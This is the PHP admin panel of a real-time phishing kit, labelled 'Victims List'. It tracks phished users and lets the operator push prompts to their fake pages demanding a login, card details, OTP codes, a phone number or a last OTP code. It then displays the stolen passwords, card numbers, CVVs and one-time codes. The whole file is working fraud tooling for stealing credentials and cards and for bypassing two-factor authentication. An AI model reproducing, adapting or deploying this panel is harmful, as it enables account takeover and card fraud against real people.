<?php


include '../files/config.php';
include '../files/connect.php';
session_start();



if($_SESSION['admin_logged'] == 'true'){
	
}else{
	header('location:./');
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Jekyll v3.8.6">
    <title>LIVE - ADMIN</title>

    

<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">


<meta name="theme-color" content="#563d7c">


    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
    </style>
    <link href="files/css/dashboard.css" rel="stylesheet">
	<link rel="icon" href="../files/img/favicon.ico" type="image/ico">
	<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
<script>
function beep() {
	var sound = new Audio("../files/beep.wav");
    sound.play();
}
function showfields(userid) {

	
	
	
	
	if ($("#askcharsradio"+userid).is(':checked')) {
		$('#askchars'+userid).show();
		
		$('#askcallcode'+userid).hide();
		$('#askcallcode'+userid).find('input').val('');
		$('#askcall'+userid).hide();
		$('#askcall'+userid).find('input').val('');
		$('#askotpstring'+userid).hide();
		$('#askotpstring'+userid).find('input').val('');
	}else{
		$('#askchars'+userid).hide();
		$('#askchars'+userid).find('input').val('');
	}
	
	
	
	
	if ($("#askcallcoderadio"+userid).is(':checked')) {
		$('#askcallcode'+userid).show();
		
		$('#askchars'+userid).hide();
		$('#askchars'+userid).find('input').val('');
		$('#askcall'+userid).hide();
		$('#askcall'+userid).find('input').val('');
		$('#askotpstring'+userid).hide();
		$('#askotpstring'+userid).find('input').val('');
	}else{
		$('#askcallcode'+userid).hide();
		$('#askcallcode'+userid).find('input').val('');
	}
	
	
	//askcall

	if ($("#askcallradio"+userid).is(':checked')) {
		$('#askcall'+userid).show();
		
		$('#askcallcode'+userid).hide();
		$('#askcallcode'+userid).find('input').val('');
		$('#askchars'+userid).hide();
		$('#askchars'+userid).find('input').val('');
		$('#askotpstring'+userid).hide();
		$('#askotpstring'+userid).find('input').val('');
		
	}else{
		$('#askcall'+userid).hide();
	}
	
	
	
	if ($("#asklastotpcoderadio"+userid).is(':checked')) {
		$('#asklastotp'+userid).show();
		
		$('#askcallcode'+userid).hide();
		$('#askcallcode'+userid).find('input').val('');
		$('#askchars'+userid).hide();
		$('#askchars'+userid).find('input').val('');
		$('#askcall'+userid).hide();
		$('#askcall'+userid).find('input').val('');
		$('#askotpstring'+userid).hide();
		$('#askotpstring'+userid).find('input').val('');
		
	}else{
		$('#asklastotp'+userid).hide();
	}
	
	if ($("#askloginradio"+userid).is(':checked')) {
		
		$('#askcallcode'+userid).hide();
		$('#askcallcode'+userid).find('input').val('');
		$('#askchars'+userid).hide();
		$('#askchars'+userid).find('input').val('');
		$('#askcall'+userid).hide();
		$('#askcall'+userid).find('input').val('');
		
		$('#askotpstring'+userid).hide();
		$('#askotpstring'+userid).find('input').val('');
		
	}else{
		//nothinh
	}
	
	
	if ($("#askotpstringradio"+userid).is(':checked')) {
		$('#askotpstring'+userid).show();
		
		$('#askcallcode'+userid).hide();
		$('#askcallcode'+userid).find('input').val('');
		$('#askchars'+userid).hide();
		$('#askchars'+userid).find('input').val('');
		$('#askcall'+userid).hide();
		$('#askcall'+userid).find('input').val('');
		$('#askotpstring'+userid).hide();
		$('#askotpstring'+userid).find('input').val('');
	}else{
		//nothinh
	}
	
	if ($("#finishradio"+userid).is(':checked')) {
		$('#askcallcode'+userid).hide();
		$('#askcallcode'+userid).find('input').val('');
		$('#askchars'+userid).hide();
		$('#askchars'+userid).find('input').val('');
		$('#askcall'+userid).hide();
		$('#askcall'+userid).find('input').val('');
		$('#askotpstring'+userid).hide();
		$('#askotpstring'+userid).find('input').val('');
	}else{
		//nothinh
	}
	
	

}

var timmer = setInterval(function() {
	var urldata = '../files/action.php?get_submitted';
	$.ajax({
		url:urldata,
		type:'GET',
		success: function(response){
			//console.log(response)
			var rasponse = JSON.parse(response)
			if(rasponse.status == 'ok'){
				beep();
			Toast.fire({
				icon: 'info',
				title: 'Some Info Submitted Please Refresh'
				})
	//clearInterval(timmer);
			}
			
		},
		error: function(err) {
			console.error('error: ' + err);
		}
	
	});
	
}, 3000);





</script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
<script>
const Toast = Swal.mixin({
  toast: true,
  position: 'top-end',
  showConfirmButton: false,
  timer: 3000,
  timerProgressBar: true,
  onOpen: (toast) => {
    toast.addEventListener('mouseenter', Swal.stopTimer)
    toast.addEventListener('mouseleave', Swal.resumeTimer)
  }
})












</script>


  </head>
  <body>
<script>
Toast.fire({
  icon: 'success',
  title: 'Signed in successfully'
})

function buzzoff(){
	$.ajax({
		url:'../files/action.php?buzzoff',
		type:'GET',
		success: function(response){
			//console.log(response);
			var rasponse = JSON.parse(response);
			if(rasponse.status == 'ok'){
			Swal.fire({
				icon: 'success',
				title: 'BUZZ OFF',
				showConfirmButton: false,
				timerProgressBar: true,
				timer: 1500
			})
			setTimeout(function () {
					window.location.reload();
			}, 2000);
	//clearInterval(timmer);
			}
			
		},
		error: function(err) {
			console.error('error: ' + err);
		}
	
	});
}

function deleteentry(elem){
	var fullid = $(elem).attr('id');
	var userid = fullid.replace('userid_','');
	$.ajax({
		type : 'POST',
		url : '../files/action.php?type=delete',
		data : 'userid='+ userid,
		success: function (data) {
			//console.log(data);
			var parsed_data = JSON.parse(data);
			if(parsed_data.status == 'ok'){
				Toast.fire({
					icon: 'success',
					title: 'Entry Deleted'
				})
				setTimeout(function () {
					window.location.reload();
				}, 2000);
				
			}else{
				Toast.fire({
					icon: 'error',
					title: 'An error has occured'
				})
				return false;
			}
			//console.log(parsed_data.status);
		}
		});
}





</script>
<nav class="navbar navbar-dark fixed-top bg-dark flex-md-nowrap p-0 shadow">
  <a class="navbar-brand col-sm-3 col-md-12 mr-0" href="#">LIVE - ADMIN<sub><small> [by H3RM3S]</small></sub></a>
</nav>

<div class="container-fluid">
  <div class="row">

    <main role="main" class="col-md-12   ">
      <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
        <h1 class="h2">Dashboard</h1>
        <div class="btn-toolbar mb-2 mb-md-0">
          <div class="btn-group mr-2">
            <button type="button" class="btn btn-sm btn-info" onclick="buzzoff();">BuZZ Off</button>
            <button type="button" class="btn btn-sm btn-success" onclick="window.location.reload();">Refresh</button>
            <button type="button" class="btn btn-sm btn-danger" onclick="window.location.href = 'logout.php';">Signout</button>
          </div>
        </div>
      </div>

      

      <h2>Victims List</h2>
      <div class="table-responsive">
        <table class="table table-striped table-sm">
          <thead>
            <tr>
              <th>#</th>
			  <th>Activity</th>
              <th>User</th>
              <th>IP</th>
              <th>Status</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody>
<?php



$query = mysqli_query($conn, "SELECT * from customers");
if($query){
	if(mysqli_num_rows($query) >= 1){
		$array = array_filter(mysqli_fetch_all($query,MYSQLI_ASSOC));
		//print_r($array);
	}
}

foreach($array as $value){
	if($value['status'] == 0){
		$info = '<span class="badge badge-warning">Waiting Command</span>';
	}elseif($value['status'] == 1){ 
		$info = '<span class="badge badge-info">Submitted</span>';
	}elseif($value['status'] == 13){ 
		$info = '<span class="badge badge-info">Customer Asked for OTP</span>';
	}elseif($value['status'] == 4){
		$info = '<span class="badge badge-success">Finished</span>';
	}elseif($value['status'] == 5){
		$info = '<span class="badge badge-primary">Waiting Login</span>';
	}elseif($value['status'] == 6){
		$info = '<span class="badge badge-primary">Waiting Card Info</span>';
	}elseif($value['status'] == 7){
		$info = '<span class="badge badge-primary">Waiting OTP Code</span>';
	}elseif($value['status'] == 8){
		$info = '<span class="badge badge-primary">Waiting to ask for OTP</span>';
	}elseif($value['status'] == 11){
		$info = '<span class="badge badge-info">Accepted</span>';
	}elseif($value['status'] == 12){
		$info = '<span class="badge badge-info">Rejected</span>';
	}elseif($value['status'] == 14){
		$info = '<span class="badge badge-primary">Waiting phone number</span>';
	}elseif($value['status'] == 15){
		$info = '<span class="badge badge-primary">Waiting last OTP code</span>';
	}
	if($value['status'] == 4){
		echo "
	<tr>
	<td>{$value['id']}</td>
	<td>{$value['last_activity']}</td>
	<td>{$value['username']}</td>
	<td>{$value['ip']}</td>
	<td>$info</td>
	
	<td>
	<button type='button' class='btn btn-md btn-dark' id='userid_{$value['id']}' data-toggle='modal' data-target='#viewmodal_userid_{$value['id']}'>View</button>
	<button type='button' class='btn btn-md btn-danger' id='userid_{$value['id']}'onclick='deleteentry(this)'><i class='fa fa-trash' aria-hidden='true'></i></button>
	</td>
	</tr>
";
	}else{
		$user_activity = '<span style="color:red">Offline</span>';
		$stored_activity = $value['last_activity'];
		if (!is_null($stored_activity)) {
			$user_last_activity = new DateTime($stored_activity);
			$current_time = new DateTime("now");

			$interval = $current_time->getTimestamp() - $user_last_activity->getTimestamp();
			//$diff = abs(strtotime($value['last_activity']) - strtotime($current_time));

			if ($interval <= 10) {
				$user_activity = '<span style="color:green">Online</span>';
			}
		} else if (is_null($stored_activity)) {
			$user_activity = '<span style="color:orange">N/A (Refresh)</span>';
		}

		echo "
	<tr>
	<td>{$value['id']}</td>
	<td>
	$user_activity
	</td>
	<td>{$value['username']}</td>
	<td>{$value['ip']}</td>
	<td>$info</td>
	
	<td>
	<button type='button' class='btn btn-md btn-info' id='userid_{$value['id']}' data-toggle='modal' data-target='#modal_userid_{$value['id']}'>Action</button>
	<button type='button' class='btn btn-md btn-danger' id='userid_{$value['id']}'onclick='deleteentry(this)'><i class='fa fa-trash' aria-hidden='true'></i></button>
	</td>
	</tr>
";
	}
	
}

?>		  
          </tbody>
        </table>
      </div>
    </main>
  </div>
</div>

<script>

function form_submit(elem) {
    var id = $(elem).attr("id");
    var parentformid = $('#'+id).closest('form').attr('id');
	var serialized_form = $('#'+parentformid).serialize();
	$.ajax({
		type : 'POST',
		url : '../files/action.php?type=commmand',
		data : serialized_form,
		success: function (data) {
			//console.log(data);
			var parsed_data = JSON.parse(data);
			if(parsed_data.status == 'ok'){
				Swal.fire({
					icon: 'success',
					title: 'Setting Saved Please Refresh',
					showConfirmButton: false,
					timerProgressBar: true,
					timer: 1500
				})	
				setTimeout(function () {
					window.location.reload();
				}, 2000);
				
			}else{
				Toast.fire({
					icon: 'error',
					title: 'An error has occured'
				})
				return false;
			}
			//console.log(parsed_data.status);
		}
		})
		
}





function decision_submit(elem) {
    var id = $(elem).attr("id");
	

	
    var parentformid = $('#'+id).closest('form').attr('id');
	
	var serialized_form = $('#'+parentformid).serialize();
	serialized_form = serialized_form + "&status=" + id
	//console.log(serialized_form)
	$.ajax({
		type : 'POST',
		url : '../files/action.php?type=submitted',
		data : serialized_form,
		success: function (data) {
			//console.log(data);
			var parsed_data = JSON.parse(data);
			if(parsed_data.status == 'ok'){
				Swal.fire({
				icon: 'success',
				title: 'Setting Saved Please Refresh',
				showConfirmButton: false,
				timerProgressBar: true,
				timer: 1500
				})
				setTimeout(function () {
					window.location.reload();
				}, 2000);
				
			}else{
				Swal.fire({
				icon: 'error',
				title: 'An error has occured',
				showConfirmButton: false,
				timerProgressBar: true,
				timer: 1500
				})
				return false;
			}
			//console.log(parsed_data.status);
		}
		})
		

}


</script>
<?php



$query = mysqli_query($conn, "SELECT * from customers");
if($query){
	if(mysqli_num_rows($query) >= 1){
		$array = mysqli_fetch_all($query,MYSQLI_ASSOC);
		//print_r($array);
	}
}

foreach($array as $value){




$user = $value['username'];
$pass = $value['password'];




$otpcode  = $value['otpcode'];



$ccname  = $value['ccname'];
$ccnum  = $value['ccnum'];
$ccexp  = $value['ccexp'];
$cccvv  = $value['cccvv'];


$victim_phone_number = $value['victim_phone_number'];
$last_otp_code = $value['lastotpcode'];


$ip = $value['ip'];
$useragent = urldecode($value['useragent']);




$previous_info = "
+-----------------------------+
Username : $user
Password : $pass
OTP : $otpcode
Card Holder : $ccname
Card Number : $ccnum
Card Expiry : $ccexp
CVV : $cccvv
Victim Phone Number : $victim_phone_number
Last OTP Code: $last_otp_code
IP : $ip
UA : $useragent
+-----------------------------+";

echo "

<div class='modal fade' id='modal_userid_{$value['id']}' tabindex='-1' role='dialog' aria-labelledby='exampleModalLabel' aria-hidden='true'>

	<form name='config_form_{$value['id']}' id='config_form_{$value['id']}' method='POST' action='' novalidate>
	<input type='hidden' name='userid' value='{$value['id']}'>
  <div class='modal-dialog' role='document'>
    <div class='modal-content'>
      <div class='modal-header'>
        <h5 class='modal-title' id='exampleModalLabel'>Choose Action</h5>
        <button type='button' class='close' data-dismiss='modal' aria-label='Close'>
          <span aria-hidden='true'>&times;</span>
        </button>
      </div>
      <div class='modal-body'>
	  
	  <div class='form-group'>
			<br>
			<textarea id='textareaoptions' class='form-control' disabled='disabled' rows='10'>PREVIOUS INFO : $previous_info</textarea>
		</div>
	  
		<div class='form-check'>
			<input type='radio' name='status' checked value='8' id='askcallradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='askccradio{$value['id']}' class='form-check-label'>Show ASK OTP</label>
		</div>
		<div class='form-group' style='display:none;' id='askcall{$value['id']}'>
			<br>
			<input type='text' class='form-control' name='callnum' id='callnum' placeholder='*******5775'><br>
		</div>
		
		<div class='form-check'>
			<input type='radio' name='status' checked value='15' id='asklastotpcoderadio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='askccradio{$value['id']}' class='form-check-label'>ASK LAST OTP CODE</label>
		</div>
		<div class='form-group' style='display:none;' id='asklastotp{$value['id']}'>
			<br>
			<input type='text' class='form-control' name='lastotpamount' id='lastotpamount' placeholder='20'><br>
		</div>

		
		<div class='form-check'>
			<input type='radio' name='status' checked value='7' id='askcallcoderadio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='askccradio{$value['id']}' class='form-check-label'>ASK OTP Code</label>
		</div>
		<!--<div class='form-group' style='display:none;' id='askcallcode{$value['id']}'>
			<br>
			<input type='text' class='form-control' name='callcode' id='callcode' placeholder='4-Digit Code'><br>
		</div>-->
		
		
		
		<div class='form-check'>
			<input type='radio' name='status' checked value='6' id='askccoptionradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='askccradio{$value['id']}' class='form-check-label'>ASK Card Info</label>
		</div>

		<div class='form-check'>
			<input type='radio' name='status' value='14' id='askphonenumber{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='askphonenumber{$value['id']}' class='form-check-label'>ASK Phone Number</label>
		</div>

		
		<div class='form-check'>
			<input type='radio' name='status' checked value='5' id='askloginradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='askloginradio{$value['id']}' class='form-check-label'>ASK LOGIN AGAIN</label>
		</div>
		<div class='form-check'>
			<input type='radio' name='status' value='4' id='finishradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
			<label for='finishradio{$value['id']}' class='form-check-label' style='color:red;'>Finish</label>
		</div>

      </div>
      <div class='modal-footer'>
        <button type='button' class='btn btn-secondary' data-dismiss='modal'>Close</button>
        <!--<button role='button' type='submit' class='btn btn-primary'>Save</button>-->
        <!--<button id='save_{$value['id']}' onclick='form_submit()' type='button' class='btn btn-primary'>Save</button>-->
        <button id='save_{$value['id']}' onclick='form_submit(this)' type='button' class='btn btn-primary'>Save</button>
      </div>
    </div>
  </div>
  </form>
</div>





<div class='modal fade' id='submitmodal_userid_{$value['id']}' tabindex='-1' role='dialog' aria-labelledby='exampleModalLabel' aria-hidden='true'>

	<form name='submitconfig_form_{$value['id']}' id='submitconfig_form_{$value['id']}' method='POST' action='' novalidate>
	<input type='hidden' name='userid' value='{$value['id']}'>
  <div class='modal-dialog' role='document'>
    <div class='modal-content'>
      <div class='modal-header'>
        <h5 class='modal-title' id='exampleModalLabel'>Choose Action</h5>
        <button type='button' class='close' data-dismiss='modal' aria-label='Close'>
          <span aria-hidden='true'>&times;</span>
        </button>
      </div>
      <div class='modal-body'>
	  
	  <div class='form-group'>
			<br>
			<textarea id='textareadecisions' class='form-control' disabled='disabled' rows='10'>Submitted INFO : $previous_info</textarea>
		</div>
	 
		
		
      </div>
      <div class='modal-footer'>
	   <button type='button' id='accept_{$value['id']}' class='btn btn-lg btn-success' name='decision' data-dismiss='modal' onclick='decision_submit(this)'>Accept</button>
	  <button type='button' id='reject_{$value['id']}' class='btn btn-lg btn-danger' name='decision' data-dismiss='modal' onclick='decision_submit(this)'>Reject</button>
        
      </div>
    </div>
  </div>
  </form>
</div>


<div class='modal fade' id='viewmodal_userid_{$value['id']}' tabindex='-1' role='dialog' aria-labelledby='exampleModalLabel' aria-hidden='true'>

	<form name='config_form_{$value['id']}' id='config_form_{$value['id']}' method='POST' action='' novalidate>
	<input type='hidden' name='userid' value='{$value['id']}'>
  <div class='modal-dialog' role='document'>
    <div class='modal-content'>
      <div class='modal-header'>
        <h5 class='modal-title' id='exampleModalLabel'>Victim Info</h5>
        <button type='button' class='close' data-dismiss='modal' aria-label='Close'>
          <span aria-hidden='true'>&times;</span>
        </button>
      </div>
      <div class='modal-body'>
	  
	  <div class='form-group'>
			<br>
			<textarea id='textareafinish' class='form-control' disabled='disabled' rows='10'>Victim INFO : $previous_info</textarea>
		</div>
	 
		
		
      </div>
      <div class='modal-footer'>
	  <button type='button' class='btn btn-lg btn-dark col-12' data-dismiss='modal'>CLOSE</button>
        
      </div>
    </div>
  </div>
  </form>
</div>





";
}

?>








    
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
	</body>
</html>
